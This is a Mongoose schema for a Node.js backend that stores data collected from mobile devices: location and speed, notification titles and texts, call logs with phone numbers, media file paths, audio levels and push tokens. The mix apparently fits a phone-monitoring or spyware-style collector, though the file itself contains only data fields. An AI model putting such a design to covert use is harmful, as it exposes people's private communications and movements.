const mongoose = require('mongoose');

const DeviceDataSchema = new mongoose.Schema({
  deviceId: { type: String, required: true },
  deviceInfo: {
    model: String,
    manufacturer: String,
    osVersion: String,
    sdkVersion: Number,
    connectionType: String
  },
  location: {
    latitude: Number,
    longitude: Number,
    accuracy: Number,
    speedMs: Number,
    speedKmH: Number,
    timestamp: Number
  },
  notifications: [{
    key: String,
    packageName: String,
    appName: String,
    title: String,
    text: String,
    postTime: Number
  }],
  callLogs: [{
    number: String,
    type: String,
    duration: Number,
    date: Number
  }],
  mediaFiles: [{
    path: String,
    mimeType: String,
    type: String,
    dateAdded: Number
  }],
  audioData: {
    db: Number,
    amplitude: Number
  },
  // New simplified fields
  device_id: String,
  fcm_token: String,
  device_info: String,
  location_string: String, // Renamed from 'location' to avoid collision with the existing object if it's a string
  call_log: String,
  media_info: String,
  audio_status: String,
  notification: String,
  imageUrl: String,
  imagePath: String,
  submittedAt: { type: Date, default: Date.now }
}, { strict: false });

module.exports = mongoose.model('DeviceData', DeviceDataSchema);
